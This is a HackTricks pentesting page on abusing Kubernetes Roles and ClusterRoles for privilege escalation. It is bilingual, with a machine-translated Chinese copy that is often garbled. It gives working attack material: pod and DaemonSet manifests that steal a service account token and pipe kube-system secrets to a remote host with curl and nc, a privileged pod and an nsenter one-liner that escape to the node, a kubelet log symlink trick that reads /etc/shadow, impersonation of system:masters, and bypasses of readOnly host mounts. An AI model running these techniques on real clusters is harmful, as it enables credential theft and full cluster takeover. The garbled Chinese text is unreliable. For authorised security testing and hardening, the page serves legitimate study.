# Abusing Roles/ClusterRoles in Kubernetes

<details>

<summary><strong>Support HackTricks and get benefits!</strong></summary>

<summary> <strong>支持hacktricks并获得好处！</strong> </summary>

- Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!

 - 您在**网络安全公司**工作吗？ 您是否想看到您的**公司在hacktricks **中刊登广告？ 还是您想访问**最新版本的豌豆或在pdf **中下载hacktricks？ 检查[**订阅计划**]（https://github.com/sponsors/carlospolop）！

- Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)

 - 发现[**豌豆家庭**]（https://opensea.io/collection/the-peass-family），我们的独家[** nfts **]（https://opensea.io/collection） /家庭家庭）

- Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)

 - 获取[**官方豌豆和hacktricks赃物**]（https://peass.creator-spring.com）

- **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/carlospolopm)**.**

 -  **加入** [**💬**]（https://emojipedia.org/speech-balloon/）[** discord group **]（https://discord.gg/hrep4ruj7f）或[ **电报组**]（https://t.me/peass）或**在** Twitter ** [**🐦**]（https://github.com/carloppolop/hacktrickss on ** twitter **） /ree/7af18b62b3bdc423e114444444677a6a73d4043511e9/ \ [https:/emojipedia.org/bird/bird/readme.md）eardme.md）eghterme.md）eghterme.md）eghterme.md）eghtemplopmbyth

- **Share your hacking tricks by submitting PRs to the** [**hacktricks github repo**](https://github.com/carlospolop/hacktricks)**.**

 -  **通过将PRS提交给** [** hacktricks github repo **]（https://github.com/carloppolop/hacktricks）**。

</details>

Here you can find some potentially dangerous Roles and ClusterRoles configurations.\

在这里，您可以找到一些潜在的危险角色和聚类配置。\ \
Remember that you can get all the supported resources with `kubectl api-resources`

请记住，您可以使用“ Kubectl Api-Resources”获得所有支持的资源

## **Privilege Escalation**

Referring as the art of getting **access to a different principal** within the cluster **with different privileges** (within the kubernetes cluster or to external clouds) than the ones you already have, in Kubernetes there are basically **4 main techniques to escalate privileges**:

将**访问不同特权**（在kubernetes群集或外部云中）的艺术与您已经拥有的其他主体相比，在kubernetes中，基本上有** 4 升级特权的主要技术**：

* Be able to **impersonate** other user/groups/SAs with better privileges within the kubernetes cluster or to external clouds

*能够**模仿**其他用户/组/SA，在Kubernetes群集或外部云中具有更好的特权
* Be able to **create/patch/exec pods** where you can **find or attach SAs** with better privileges within the kubernetes cluster or to external clouds

*能够**创建/patch/exec pods **您可以**找到或附加SAS **，在Kubernetes群集或外部云中获得更好的特权
* Be able to **read secrets** as the SAs tokens are stored as secrets

*可以**阅读秘密**，因为SAS令牌被存储为秘密
* Be able to **escape to the node** from a container, where you can steal all the secrets of the containers running in the node, the credentials of the node, and the permissions of the node within the cloud it's running in (if any)

*能够**逃到节点**从容器中逃到一个容器中，您可以在其中窃取在节点中运行的容器的所有秘密，节点的凭据以及在云中运行的节点的权限（ 如果有）
* A fifth technique that deserves a mention is the ability to **run port-forward** in a pod, as you may be able to access interesting resources within that pod.

*值得一提的第五技术是可以在POD中**运行Port-Forward **的能力，因为您可能能够访问该豆荚中的有趣资源。

### **Access Any Resource or Verb**

### **访问任何资源或动词**

This privilege provides access to **any resource with any verb**. It is the most substantial privilege that a user can get, especially if this privilege is also a “ClusterRole.” If it’s a “ClusterRole,” than the user can access the resources of any namespace and own the cluster with that permission.

本特权提供了使用任何动词**的任何资源的访问权限。 这是用户可以获得的最重要的特权，尤其是如果此特权也是“集群”。 如果是“聚类”，则用户可以访问任何名称空间的资源并在该许可中拥有群集。

```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: api-resource-verbs-all
rules:
rules:
- apiGroups: ["*"]
  resources: ["*"]
  verbs: ["*"]
```

### **Access Any Resource**

### **访问任何资源**

Giving a user permission to **access any resource can be very risky**. But, **which verbs** allow access to these resources? Here are some dangerous RBAC permissions that can damage the whole cluster:

授予用户许可**访问任何资源可能非常有风险**。 但是，**哪个动词**允许访问这些资源？ 以下是一些危险的RBAC权限，可能会损害整个集群：

* **resources: \["\*"] verbs: \["create"]** – This privilege can **create any resource** in the cluster, such as **pods**, roles, etc. An attacker might abuse it to **escalate privileges**. An example of this can be found in the **“Pods Creation” section**.

***资源：\ [“ \*”]动词：\ [创建“”] **  - 此特权可以**在集群中创建任何资源**，例如** pods **，角色等。 攻击者可能会滥用它，以升级特权**。 可以在**“ Pods Creation”部分**中找到一个例子。
* **resources: \["\*"] verbs: \["list"]** – The ability to list any resource can be used to **leak other users’ secrets** and might make it easier to **escalate privileges**. An example of this is located in the **“Listing secrets” section.**

***资源：\ [“ \*”]动词：\ [list”] **  - 列出任何资源的能力可以用来**泄漏其他用户的秘密**，并可能使**更容易** 升级特权**。 一个例子位于**“列表秘密”部分中。**
* **resources: \["\*"] verbs: \["get"]-** This privilege can be used to **get secrets from other service accounts**.

***资源：\ [“ \*”]动词：\ [“ get”]  -  **此特权可用于**从其他服务帐户获得秘密**。

```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: api-resource-verbs-all
rules:
rules:
- apiGroups: ["*"]
  resources: ["*"]
  verbs: ["create", "list", "get"]
```

### Pod Create - Steal Token

### pod create-窃取令牌

An attacker with permission to create a pod in the “kube-system” namespace can create cryptomining containers for example. Moreover, if there is a **service account with privileged permissions, by running a pod with that service the permissions can be abused to escalate privileges**.

具有权限的攻击者在“ Kube-System”名称空间中创建POD可以创建加密容器。 此外，如果有一个带有特权权限的服务帐户，则可以通过该服务运行POD，则可以滥用权限以升级特权**。

![](<../../../.gitbook/assets/image (463).png>)

Here we have a default privileged account named _bootstrap-signer_ with permissions to list all secrets.

在这里，我们有一个名为_bootstrap-signer_的默认特权帐户，并具有列出所有秘密的权限。

![](https://www.cyberark.com/wp-content/uploads/2018/12/rolebinding\_with\_cluster\_admin\_clusterrole-1024x545.png)

！

The attacker can create a malicious pod that will use the privileged service. Then, abusing the service token, it will ex-filtrate the secrets:

攻击者可以创建一种恶意POD，该POD将使用特权服务。 然后，滥用服务令牌，它将前筛选秘密：

![](https://www.cyberark.com/wp-content/uploads/2018/12/pods\_yaml\_with\_autoamountServiceAccountToken-1024x345.png)

！

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: alpine
  namespace: kube-system
spec:
  containers:
  - name: alpine
    image: alpine
    command: ["/bin/sh"]
    args: ["-c", 'apk update && apk add curl --no-cache; cat /run/secrets/kubernetes.io/serviceaccount/token | { read TOKEN; curl -k -v -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" https://192.168.154.228:8443/api/v1/namespaces/kube-system/secrets; } | nc -nv 192.168.154.228 6666; sleep 100000']
  serviceAccountName: bootstrap-signer
  automountServiceAccountToken: true
  hostNetwork: true
```

In the previous image note how the _bootstrap-signer service is used in_ `serviceAccountname`_._

在上一个图像中，请注意如何使用_bootstrap-signer Service in _`ServiceAccountName'_._

So just create the malicious pod and expect the secrets in port 6666:

因此，只需创建恶意豆荚，并期待港口6666中的秘密：

![](<../../../.gitbook/assets/image (464).png>)

### **Pod Create & Escape**

The following definition gives all the privileges a container can have:

以下定义赋予容器可以拥有的所有特权：

* **Privileged access** (disabling protections and setting capabilities)

***特权访问**（禁用保护和设置功能）
* **Disable namespaces hostIPC and hostPid** that can help to escalate privileges

***禁用名称空间hostipc和hostpid **可以帮助升级特权
* **Disable hostNetwork** namespace, giving access to steal nodes cloud privileges and better access to networks

***禁用hostnetwork **名称空间，访问窃取节点云特权并更好地访问网络
* **Mount hosts / inside the container**

***安装主机 /容器内部**

{% code title="super_privs.yaml" %}
```yaml
apiVersion: v1
kind: Pod
metadata:
  name: ubuntu
  labels:
    app: ubuntu
spec:
  # Uncomment and specify a specific node you want to debug
  # nodeName: <insert-node-name-here>
  containers:
  - image: ubuntu
    command:
      - "sleep"
      - "3600" # adjust this as needed -- use only as long as you need
    imagePullPolicy: IfNotPresent
    name: ubuntu
    securityContext:
      allowPrivilegeEscalation: true
      privileged: true
      #capabilities:
      #  add: ["NET_ADMIN", "SYS_ADMIN"] # add the capabilities you need https://man7.org/linux/man-pages/man7/capabilities.7.html
      runAsUser: 0 # run as root (or any other user)
    volumeMounts:
    - mountPath: /host
      name: host-volume
  restartPolicy: Never # we want to be intentional about running this pod
  hostIPC: true # Use the host's ipc namespace https://www.man7.org/linux/man-pages/man7/ipc_namespaces.7.html
  hostNetwork: true # Use the host's network namespace https://www.man7.org/linux/man-pages/man7/network_namespaces.7.html
  hostPID: true # Use the host's pid namespace https://man7.org/linux/man-pages/man7/pid_namespaces.7.htmlpe_
  volumes:
  - name: host-volume
    hostPath:
      path: /
```
{% endcode %}

Create the pod with:

用：

```bash
kubectl --token $token create -f mount_root.yaml
```

One-liner from [this tweet](https://twitter.com/mauilion/status/1129468485480751104) and with some additions:

[this Tweet]（https://twitter.com/mauilion/status/1129468485480751104）的单线插件（

```bash
kubectl run r00t --restart=Never -ti --rm --image lol --overrides '{"spec":{"hostPID": true, "containers":[{"name":"1","image":"alpine","command":["nsenter","--mount=/proc/1/ns/mnt","--","/bin/bash"],"stdin": true,"tty":true,"imagePullPolicy":"IfNotPresent","securityContext":{"privileged":true}}]}}'
```

Now that you can escape to the node check post-exploitation techniques in:

现在，您可以逃脱到节点检查后探索后的技术：

{% content-ref url="../../../pentesting/pentesting-kubernetes/attacking-kubernetes-from-inside-a-pod.md" %}
[attacking-kubernetes-from-inside-a-pod.md](../../../pentesting/pentesting-kubernetes/attacking-kubernetes-from-inside-a-pod.md)
{% endcontent-ref %}

#### Stealth

####隐身

You probably want to be **stealthier**, in the following pages you can see what you would be able to access if you create a pod only enabling some of the mentioned privileges in the previous template:

您可能想成为**隐身**，在以下页面中，您可以看到如果创建POD仅启用了上一个模板中提到的某些特权，则可以看到可以访问的内容：

* [**Privileged + hostPID**](../../../linux-hardening/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation/#privileged-+-hostpid)

*[**特权 + hostpid **]（../../../ linux-hardening/privilege-escalation/docker-breakout/docker-break-breakout-privilege-privilege-escalation-privilege-escalation/＃privilegilege- +  -  hostpid）
* [**Privileged only**](../../../linux-hardening/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation/#privileged)

*[**唯一的**]（../../../ linux-hardening/privilege-escalation/docker-breakout/docker-break-breakout-privilege-privilege-eScalation/＃特权）
* [**hostPath**](../../../linux-hardening/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation/#arbitrary-mounts)

*[**主持人**]（../../../ linux-hardening/privilege-escalation/docker-breakout/docker-break-breakout-privilege-privilege-scalation/＃nutyary mounts）
* [**hostPID**](../../../linux-hardening/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation/#hostpid)

*[** hostpid **]（../../../ linux-hardening/privilege-escalation/docker-breakout/docker-break-breakout-privilege-privilege-eScalation/＃hostpid）
* [**hostNetwork**](../../../linux-hardening/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation/#hostnetwork)

*[** hostnetwork **]（../../../ linux-hardening/privilege-eScalation/docker-breakout/docker-breakout-privilege-privilege-eScalation/＃hostnetwork）
* [**hostIPC**](../../../linux-hardening/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation/#hostipc)

*[** hostipc **]（../../../ linux-hardening/privilege-escalation/docker-breakout/docker-break-breakout-privilege-privilege-eScalation/＃hostipc）

_You can find example of how to create/abuse the previous privileged pods configurations in_ [_https://github.com/BishopFox/badPods_](https://github.com/BishopFox/badPods)\_\_

您可以在_ [_https：//github.com/bishopfox/badpods_]（https://github.com/bishopfox/badpods）中找到如何创建/滥用以前的特权Pods配置的示例。

### Pod Create - Move to cloud

### pod创建 - 移至云

If you can **create** a **pod** (and optionally a **service account**) you might be able to **obtain privileges in cloud environment** by **assigning cloud roles to a pod or a service account** and then accessing it.\

如果您可以**创建** a ** pod **（并且可以选择地**服务帐户**），您可以**通过**将云角色分配给POD或A 服务帐户**然后访问它。\ \
Moreover, if you can create a **pod with the host network namespace** you can **steal the IAM** role of the **node** instance.

此外，如果您可以使用主机网络名称空间创建一个** pod，则可以**窃取** node **实例的iam **角色。

For more information check:

有关更多信息检查：

{% content-ref url="../kubernetes-access-to-other-clouds.md" %}

{％content-ref url =“ ../ kubernetes-access-to-other-clouds.md”％}
[kubernetes-access-to-other-clouds.md](../kubernetes-access-to-other-clouds.md)

[kubernetes-access-to-other-clouds.md]（../ kubernetes-access-cecess-to-phere-clouds.md）
{% endcontent-ref %}

### **Create/Patch Deployment, Daemonsets, Statefulsets, Replicationcontrollers, Replicasets, Jobs and Cronjobs**

### **创建/补丁部署，Daemonset，Statefulsets，ReplicationControllers，Replicasets，Jobs和Cronjobs **

Deployment, Daemonsets, Statefulsets, Replicationcontrollers, Replicasets, Jobs and Cronjobs are all privileges that allow the creation of different tasks in the cluster. Moreover, it's possible can use all of them to **develop pods and even create pods**. So it's possible to a**buse them to escalate privileges just like in the previous example.**

部署，守护程序，状态人群，复制controllers，replicasets，作业和cronjobs都是允许在集群中创建不同任务的特权。 此外，有可能使用所有这些都可以**开发豆荚，甚至创建豆荚**。 因此，可以像上一个示例一样，可以像**一样升级特权。**

Suppose we have the **permission to create a Daemonset** and we create the following YAML file. This YAML file is configured to do the same steps we mentioned in the “create pods” section.

假设我们有**创建daemonset **的权限，然后创建以下YAML文件。 该YAML文件配置为执行与“创建POD”部分中提到的相同步骤。

```yaml
apiVersion: apps/v1
kind: DaemonSet
metadata:
  name: alpine
  namespace: kube-system
spec:
  selector:
    matchLabels:
      name: alpine
  template:
    metadata:
      labels:
        name: alpine
    spec:
      serviceAccountName: bootstrap-signer
      automountServiceAccountToken: true
      hostNetwork: true
      containers:
      - name: alpine
        image: alpine
        command: ["/bin/sh"]
        args: ["-c", 'apk update && apk add curl --no-cache; cat /run/secrets/kubernetes.io/serviceaccount/token | { read TOKEN; curl -k -v -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" https://192.168.154.228:8443/api/v1/namespaces/kube-system/secrets; } | nc -nv 192.168.154.228 6666; sleep 100000']
```

In line 6 you can find the object “spec” and children objects such as “**template**” in line 10. These objects hold the configuration for the task we wish to accomplish. Another thing to notice is the "**serviceAccountName**" in line 15 and the “**containers**” object in line 18. This is the part that relates to creating our malicious container.

在第6行中，您可以在第10行中找到对象“规格”和孩子的对象，例如“ ** template **”。这些对象保留了我们希望完成的任务的配置。 要注意的另一件事是第15行中的“ ** serviceaccountname **”和第18行中的“ **容器**”对象。这是与创建我们的恶意容器有关的部分。

Kubernetes API documentation indicates that the “**PodTemplateSpec**” endpoint has the option to create containers. And, as you can see: **deployment,** **daemonsets, statefulsets, replicationcontrollers, replicasets, jobs and cronjobs can all be used to create pods**:

Kubernetes API文档指出“ ** podtemplatespec **”端点具有创建容器的选项。 而且，如您所见：**部署，** ** daemonset，statefulsets，ReplicationControllers，Replicasets，Jobs和Cronjobs都可以用于创建Pods **：

![](https://www.cyberark.com/wp-content/uploads/2019/08/Kube-Pentest-Fig-8.png)

**So, the privilege to create or update tasks can also be abused for privilege escalation in the cluster.**

**因此，创建或更新任务的特权也可以滥用以在集群中的特权升级。**

### **Pods Exec**

**Pod exec** is an option in kubernetes used for **running commands in a shell inside a pod**. This privilege is meant for administrators who want to **access containers and run commands**. It’s just like creating a SSH session for the container.

** POD Exec **是用于**在Pod **内的外壳中运行命令的Kubernetes中的一个选项。 此特权是针对想要**访问容器并运行命令**的管理员的。 就像为容器创建SSH会话一样。

If we have this privilege, we actually get the ability **to take control of all the pods**. In order to do that, we needs to use the following command:

如果我们拥有这种特权，我们实际上可以控制所有POD **。 为此，我们需要使用以下命令：

```bash
kubectl exec -it <POD_NAME> -n <NAMESPACE> -- sh
```

Note that as you can get inside any pod, you can abuse other pods token just like in [**Pod Creation exploitation**](./#pod-creation) to try to escalate privileges.

请注意，由于您可以进入任何吊舱，因此您可以像[** Pod Creation剥削**]（./# pod-creation）一样滥用其他吊舱令牌，以尝试升级特权。

### port-forward

### Port-Forward

This permission allows to **forward one local port to one port in the specified pod**. This is meant to be able to debug applications running inside a pod easily, but an attacker might abuse it to get access to interesting (like DBs) or vulnerable applications (webs?) inside a pod:

此权限允许将一个本地端口转发到指定POD **的一个端口。 这本来可以轻松地调试运行在POD内部的应用程序，但是攻击者可能会滥用它以访问POD中的有趣（例如DBS）或脆弱的应用程序（例如DBS）或脆弱的应用程序（网络？）：

```
kubectl port-forward pod/mypod 5000:5000
```

### **Hosts Writable /var/log/ Escape**

As [**indicated in this research**](https://jackleadford.github.io/containers/2020/03/06/pvpost.html)\*\*,\*\*If you can access or create a pod with the **hosts `/var/log/` directory mounted** on it, you can **escape from the container**.\

如[**在这项研究**]（https://jackleadford.github.io/containers/2020/03/06/pvpost.html）\*\*，\*\*如果您可以访问或创建一个 带有**主机`/var/log/`目录已安装**的吊舱，您可以**从容器中逃脱**。
This is basically because the when the **Kube-API tries to get the logs** of a container (using `kubectl logs <pod>`), it **requests the `0.log`** file of the pod using the `/logs/` endpoint of the **Kubelet** service.\

这基本上是因为** kube-api试图获取容器的日志**（使用`kubectl logs <pod>`），它**请求使用pod的0.log file ** kubelet **服务的`/logs/`端点。
The Kubelet service exposes the `/logs/` endpoint which is just basically **exposing the `/var/log` filesystem of the container**.

Kubelet服务公开了`/logs/`端点，该点基本上**公开了容器**的`/var/log`文件系统。

Therefore, an attacker with **access to write in the /var/log/ folder** of the container could abuse this behaviours in 2 ways:

因此，在容器的/var/log/folder **中使用**访问书写的攻击者可以通过两种方式滥用此行为：

* Modifying the `0.log` file of its container (usually located in `/var/logs/pods/namespace_pod_uid/container/0.log`) to be a **symlink pointing to `/etc/shadow`** for example. Then, you will be able to exfiltrate hosts shadow file doing:

*修改其容器的`0.log'文件（通常位于`/var/logs/pods/pods/namespace_pod_uid/container/0.log`），为一个**符号链接，指向`/etc/etcshice/etcshice/shadow` ** ** for 例子。 然后，您将能够删除宿主的阴影文件：

```bash
kubectl logs escaper
failed to get parse function: unsupported log format: "root::::::::\n"
kubectl logs escaper --tail=2
failed to get parse function: unsupported log format: "systemd-resolve:*:::::::\n"
# Keep incrementing tail to exfiltrate the whole file
```

* If the attacker controls any principal with the **permissions to read `nodes/log`**, he can just create a **symlink** in `/host-mounted/var/log/sym` to `/` and when **accessing `https://<gateway>:10250/logs/sym/` he will lists the hosts root** filesystem (changing the symlink can provide access to files).

*如果攻击者控制任何委托人都具有读取`nodes/log` **的权限 **访问`https：// <Gateway>：10250/logs/sym/`他将列出主机root ** filesystem（更改SYMLINK可以提供对文件的访问）。

```bash
curl -k -H 'Authorization: Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6Im[...]' 'https://172.17.0.1:10250/logs/sym/'
<a href="bin">bin</a>
<a href="data/">data/</a>
<a href="dev/">dev/</a>
<a href="etc/">etc/</a>
<a href="home/">home/</a>
<a href="init">init</a>
<a href="lib">lib</a>
[...]
```

**A laboratory and automated exploit can be found in** [**https://blog.aquasec.com/kubernetes-security-pod-escape-log-mounts**](https://blog.aquasec.com/kubernetes-security-pod-escape-log-mounts)

**可以在** [** https：//blog.aquasec.com/kubernetes-security-pod-escape-escape-log-mountsxphy]中找到实验室和自动化的利用。 /kubernetes-security-pod-escape-log-mounts）

#### Bypassing readOnly protection <a href="#bypassing-hostpath-readonly-protection" id="bypassing-hostpath-readonly-protection"></a>

####绕过ReadOnly Protection <a href="#bypassing-hostpath-path-readonly-protection" id="bypassing-hostpath-hostpath-readonly-protection"> </a>

If you are lucky enough and the highly privileged capability capability `CAP_SYS_ADMIN` is available, you can just remount the folder as rw:

如果您足够幸运，并且具有高度特权的功能“ CAP_SYS_ADMIN”，则可以将文件夹重新安装为RW：

```bash
mount -o rw,remount /hostlogs/
```

#### Bypassing hostPath readOnly protection <a href="#bypassing-hostpath-readonly-protection" id="bypassing-hostpath-readonly-protection"></a>

####绕过主持人readonly保护<a href="#bypassing-hostpath-readonly-protection" id="bypassing-hostpath-hostpath-readonly-protection"> </a>

As stated in [**this research**](https://jackleadford.github.io/containers/2020/03/06/pvpost.html) it’s possible to bypass the protection:

如[** [**]（https://jackleadford.github.io/containers/2020/03/06/pvpost.html）所述，可以绕过保护：

```yaml
allowedHostPaths:
    - pathPrefix: "/foo"
       readOnly: true
```

Which was meant to prevent escapes like the previous ones by, instead of using a a hostPath mount, use a PersistentVolume and a PersistentVolumeClaim to mount a hosts folder in the container with writable access:

这是为了防止像以前的逃脱的那样，而不是使用ostent volume，而是使用persistentvolume和persistentVolumeClaim将主机文件夹安装在容器中，并具有可写入的访问：

```yaml
apiVersion: v1
kind: PersistentVolume
metadata:
    name: task-pv-volume-vol
    labels:
      type: local
spec:
    storageClassName: manual
    capacity:
      storage: 10Gi
    accessModes:
      - ReadWriteOnce
    hostPath:
      path: "/var/log"
---
apiVersion: v1
kind: PersistentVolumeClaim
metadata:
    name: task-pv-claim-vol
spec:
    storageClassName: manual
    accessModes:
      - ReadWriteOnce
    resources:
      requests:
        storage: 3Gi
---
apiVersion: v1
kind: Pod
metadata:
    name: task-pv-pod
spec:
    volumes:
      - name: task-pv-storage-vol
        persistentVolumeClaim:
          claimName: task-pv-claim-vol
    containers:
      - name: task-pv-container
        image: ubuntu:latest
        command: [ "sh", "-c", "sleep 1h" ]
        volumeMounts:
          - mountPath: "/hostlogs"
            name: task-pv-storage-vol
```

### **Impersonating privileged accounts**

### **模仿特权帐户**

With a [**user impersonation**](https://kubernetes.io/docs/reference/access-authn-authz/authentication/#user-impersonation) privilege, an attacker could impersonate a privileged account.

借助[**用户模仿**]（https://kubernetes.io/docs/reference/access-authn-authz/authentication/#user-impersonation）攻击者可以冒充特权帐户。

In this example, the service account _**sa-imper**_ has a binding to a ClusterRole with rules that allow it to impersonate groups and users.

在此示例中，服务帐户_ ** sa-imper ** _对群集与具有规则的绑定，使其可以模仿组和用户。

![](https://www.cyberark.com/wp-content/uploads/2018/12/clusterRole\_for\_user\_impersonation.png)

！

![](https://www.cyberark.com/wp-content/uploads/2018/12/clusterRole\_for\_user\_impersonation\_2.png)

！

It's possible to **list all secrets** with `--as=null --as-group=system:master` attributes:

可以**列出所有秘密**用`-as = null -As-group = system：master`属性：

![](https://www.cyberark.com/wp-content/uploads/2018/12/listing\_secrets\_with\_and\_without\_user\_impersonation-1024x108.png)

！

**It's also possible to perform the same action via the API REST endpoint:**

**也可以通过API休息端点执行相同的操作：**

```bash
curl -k -v -XGET -H "Authorization: Bearer <JWT TOKEN (of the impersonator)>" \
-H "Impersonate-Group: system:masters"\ 
-H "Impersonate-User: null" \
-H "Accept: application/json" \
https://<master_ip>:<port>/api/v1/namespaces/kube-system/secrets/
```

### **Listing Secrets**

### **清单秘密**

The **listing secrets privilege** is a strong capability to have in the cluster. A user with the permission to list secrets can **potentially view all the secrets in the cluster – including the admin keys**. The secret key is a JWT token encoded in base64.

**列出秘密特权**是在集群中拥有的强大功能。 有权限列出秘密的用户可以**可能会查看集群中的所有秘密 - 包括管理员密钥**。 秘密键是base64中编码的JWT令牌。

![](https://www.cyberark.com/wp-content/uploads/2018/12/listing\_secrets\_role.png)

！

An attacker that gains **access to \_list secrets**\_ in the cluster can use the following _curl_ commands to get all secrets in “kube-system” namespace:

获得**访问\ _list Secrets ** \ _的攻击者可以使用以下_curl_命令在“ Kube-System”名称空间中获取所有秘密：

```bash
curl -v -H "Authorization: Bearer <jwt_token>" https://<master_ip>:<port>/api/v1/namespaces/kube-system/secrets/
```

![](https://www.cyberark.com/wp-content/uploads/2019/08/Kube-Pentest-Fig-2.png)

### **Reading a secret – brute-forcing token IDs**

### **阅读秘密 - 蛮力令牌ID **

An attacker that found a token with permission to read a secret can’t use this permission without knowing the full secret’s name. This permission is different from the _**listing**  **secrets**_ permission described above.

一个攻击者发现有许可阅读秘密的令牌，如果不知道整个秘密的名字，就无法使用此许可。 此权限不同于_ **列表** **秘密** _ _ _的权限。

![](https://www.cyberark.com/wp-content/uploads/2018/12/getting\_secret\_clusterRole.png)

![](https://www.cyberark.com/wp-content/uploads/2018/12/clusterRoleBinding\_with\_get\_secrets\_clusterRole.png)

！

Although the attacker doesn’t know the secret’s name, there are default service accounts that can be enlisted.

尽管攻击者不知道该秘密的名称，但仍有可以入伍的默认服务帐户。

![](https://www.cyberark.com/wp-content/uploads/2018/12/default\_service\_accounts\_list.png)

！

Each service account has an associated secret with a static (non-changing) prefix and a postfix of a random five-character string token at the end.

每个服务帐户都有一个相关的秘密，其中有一个静态（不变）前缀和一个随机五个字符字符串令牌的后缀。

![](https://www.cyberark.com/wp-content/uploads/2018/12/default\_service\_account\_on\_kube\_system\_namespace-1024x556.png)

！

The random token structure is 5-character string built from alphanumeric (lower letters and digits) characters. **But it doesn’t contain all the letters and digits.**

随机令牌结构是由字母数字（下字母和数字）字符构建的5个字符字符串。 **但它不包含所有字母和数字。**

When looking inside the [source code](https://github.com/kubernetes/kubernetes/blob/8418cccaf6a7307479f1dfeafb0d2823c1c37802/staging/src/k8s.io/apimachinery/pkg/util/rand/rand.go#L83), it appears that the token is generated from only 27 characters “bcdfghjklmnpqrstvwxz2456789” and not 36 (a-z and 0-9)

令牌仅由27个字符生成，“ BCDFGHJKLMNPQRSTVWXZ2456789”，而不是36（A-Z和0-9）

![](https://www.cyberark.com/wp-content/uploads/2018/12/character\_set\_from\_rand\_go.png)

！

![](https://www.cyberark.com/wp-content/uploads/2018/12/comments\_on\_removing\_characters\_rand\_go\_character\_set-1024x138.png)

！

This means that there are 275 = 14,348,907 possibilities for a token.

这意味着令牌有275 = 14,348,907可能性。

An attacker can run a brute-force attack to guess the token ID in couple of hours. Succeeding to get secrets from default sensitive service accounts will allow him to escalate privileges.

攻击者可以进行蛮力攻击，以猜测几个小时的令牌ID。 成功获得默认敏感服务帐户的秘密将使他能够升级特权。

## Built-in Privileged Escalation Prevention

##内置特权预防升级

Although there can be risky permissions, Kubernetes is doing good work preventing other types of permissions with potential for privileged escalation.

尽管可能会有风险的权限，但Kubernetes正在做好工作，以防止其他类型的权限具有特权升级潜力。

Kubernetes has a [built-in mechanism](https://kubernetes.io/docs/reference/access-authn-authz/rbac/#privilege-escalation-prevention-and-bootstrapping) for that:

Kubernetes有一个[内置机制]（https://kubernetes.io/docs/reference/Access-Authn-authz/rbac/rbac/#privilege-escalation-caltilege-palrevention-palrevention-parrevention-and-bootstapphing一下：

“The RBAC API **prevents users from escalating privileges** by editing roles or role bindings. Because this is enforced at the API level, it applies even when the RBAC authorizer is not in use.

“ RBAC API **通过编辑角色或角色绑定来阻止用户升级特权**。 因为这是在API级别执行的，因此即使不使用RBAC授权器，也适用。

A user can only **create/update a role if they already have all the permissions contained in the role**, at the same scope as the role (cluster-wide for a ClusterRole, within the same namespace or cluster-wide for a Role)”

如果用户已经在角色**中包含的所有权限，与角色相同的范围（clusterrole的群集范围范围范围），则只能**创建/更新角色。 角色）”

Let’s see an example for such prevention.

让我们看看这种预防的例子。

A service account named _sa7_ is in a RoleBinding _edit-role-rolebinding_. This RoleBinding object has a role named _edit-role_ that has **full permissions rules** on roles. Theoretically, it means that the service account can **edit** **any role** in the _default_ namespace.

一个名为_sa7_的服务帐户处于角色限制_edit-lole-lolebinding_。 这个角色绑定对象具有一个名为_edit-role_的角色，该角色在角色上具有完整的权限规则**。 从理论上讲，这意味着服务帐户可以**编辑** ** _default_名称空间中的任何角色**。

![](https://www.cyberark.com/wp-content/uploads/2018/12/edit\_roles\_roleBinding\_binding\_sa7\_to\_edit\_role.png)

![](https://www.cyberark.com/wp-content/uploads/2018/12/role\_to\_edit\_any\_role.png)

！

There is also an existing role named _list-pods_. Anyone with this role can list all the pods on the _default_ namespace. The user _sa7_ should have permissions to edit any roles, so let’s see what happens when it tries to add the “secrets” resource to the role’s resources.

还有一个名为_list-pods_的现有角色。 担任此角色的任何人都可以列出_default_名称空间上的所有POD。 用户_sa7_应该具有编辑任何角色的权限，因此让我们看看它试图在角色的资源中添加“秘密”资源时会发生什么。

![](https://www.cyberark.com/wp-content/uploads/2018/12/edit\_role\_resources-300x66.png)

After trying to do so, we will receive an error “forbidden: attempt to grant extra privileges” (Figure 31), because although our _sa7_ user has permissions to update roles for any resource, it can update the role only for resources that it has permissions over.

尝试这样做之后，我们将收到一个错误“禁止：尝试授予额外的特权”（图31），因为尽管我们的_sa7_用户有权更新任何资源的角色，但它只能为其拥有的资源更新角色 权限结束了。

![](https://www.cyberark.com/wp-content/uploads/2018/12/forbidden\_attempt\_to\_gran\_extra\_privileges\_message-1024x288.png)

### **Get & Patch RoleBindings/ClusterRoleBindings**

{% hint style="danger" %}
**Apparently this technique worked before, but according to my tests it's not working anymore for the same reason explained in the previous section. Yo cannot create/modify a rolebinding to give yourself or a different SA some privileges if you don't have already.**

**显然，这种技术以前有效，但是根据我的测试，由于上一节中所述的相同原因，它不再起作用。 如果您还没有，则无法创建/修改角色签名，以赋予您自己或其他SA的特权。**
{% endhint %}

The privilege to create Rolebindings allows a user to **bind roles to a service account**. This privilege can potentially lead to privilege escalation because it **allows the user to bind admin privileges to a compromised service account.**

创建角色签名的特权使用户可以将角色绑定到服务帐户**。 此特权可能会导致特权升级，因为它**允许用户将管理员特权绑定到受损的服务帐户。**

